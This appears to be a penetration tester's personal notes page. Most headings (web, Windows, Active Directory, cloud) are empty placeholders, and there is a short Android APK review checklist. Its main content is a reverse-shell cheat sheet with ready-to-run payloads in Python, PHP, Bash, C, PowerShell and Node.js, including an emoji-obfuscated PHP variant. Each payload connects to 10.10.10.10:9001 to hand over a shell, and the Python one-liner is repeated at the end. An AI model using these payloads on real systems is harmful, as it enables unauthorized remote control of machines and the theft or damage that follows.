---
layout: page
title: "/brainbox"
permalink: /brainbox/
---

# INFASTRUCTURE

<details><summary> <b>API</b> </summary><blockquote>
  <details><summary>REST</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>SOAP</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>


<details><summary> <b>WEB</b> </summary><blockquote>
    <br/>
Start with automated tools to search for low hanging fruits 
   Burpsuite Scanner
   OWASP Zap 
   Accunetix
   Nikto 
   
   
  <details><summary>SQLi</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>SSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>IDOR</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>XSS</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>BAC</summary><blockquote>
        Broken Access Control
    :smile:
  </blockquote></details>
    <details><summary>XXE</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>SDE</summary><blockquote>
        secure data exposure
    :smile:
  </blockquote></details>
    <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>MOBILE</b> </summary><blockquote>
  <details><summary>Android</summary><blockquote>
    ### Checklist
    <br>
1. unzip -d and apktool -d both (different outputs at time)
    <br>
2. check for /assets and /res/raw (api keys, encryption keys)
<br>
    
3. sensitive files and external storage (world readable  & writeable)
    <br>
4. executables & log files on external storage
    <br>
5. look at manifest (WRITE_EXTERNAL_STORAGE)., grep for "getExternal"
    <br>
6. check for installed package "vnd.android.package-archive" (they want to install something)
    <br>
7. hidden directories (.folder)
    <br>
8. api keys saved as bytearray to obfuscate
    <br>
9. identify crypto & understand it
    <br>
10. webSettings.setJavaScriptEnabled(True); means we might be able to XSS
    <br>
11. interesting options: "setAllowContent", "setAllowFileAccess", "setAllowFileAccessFromFileURILS", "setAllowUniversalAccessFromFileURLs", "setJavaScriptEnabled", "setPluginState", "setSavePassword"
    <br>
12. overwriting ssl errors :facepalm:
    <br>
13. xss might allow to call Runtime.getRuntime().exec() (CVE-2012-6636) <= Api17
      <br>                                                                     
14. use Mitm Proxy (mitm.it has the cert)
      <br>                                                                     
    :smile:
  </blockquote></details>
  <details><summary>iOS</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>*NIX</b> </summary><blockquote>
  <details><summary>Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>Privilege Escalation</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>Post Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>WINDOWS</b> </summary><blockquote>
  <details><summary>Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>Privilege Escalation</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>Post Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>ACTIVE DIRECTORY</b> </summary><blockquote>
  <details><summary>Initial Access</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>Domain Enumeration And Attack</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>Lateral Movements</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>
<br/>

<details><summary> <b>CLOUD</b> </summary><blockquote>
  <details><summary>AZURE</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>AWS</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>
<details><summary> <b>SHELLS</b> </summary><blockquote>
  <details><summary>Reverse Shells</summary><blockquote>
#### Python
```python
  python -c 'import pty;pty.spawn("/bin/bash")';
```
    
#### Python
```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
    
#### PHP
```php
    php -r '$sock=fsockopen("10.10.10.10",9001);system("sh <&3 >&3 2>&3");'
```
    
#### Bash
```bash
    sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
 ```
    
#### PHP Emoji
```php
    php -r '$ð="1";$ð="2";$ð
="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = "10.10.10.10";$ð» = 9001;$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð
. $ð¤¢. $ð¤ . $ðµ. $ð
. $ð¤¢. $ð. $ð¤ . $ðµ. $ð
;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);'
```
    
#### C
```c
    #include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 9001;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.10.10");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execve("sh", argv, NULL);

    return 0;       
}
```
    
#### Powershell
    
```powershell
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```

#### NodeJS
```javascript
    (function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(9001, "10.10.10.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```
    
    
    :smile:
  </blockquote></details>
  <details><summary>Web Shells</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>


<br/>
<br/>


```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```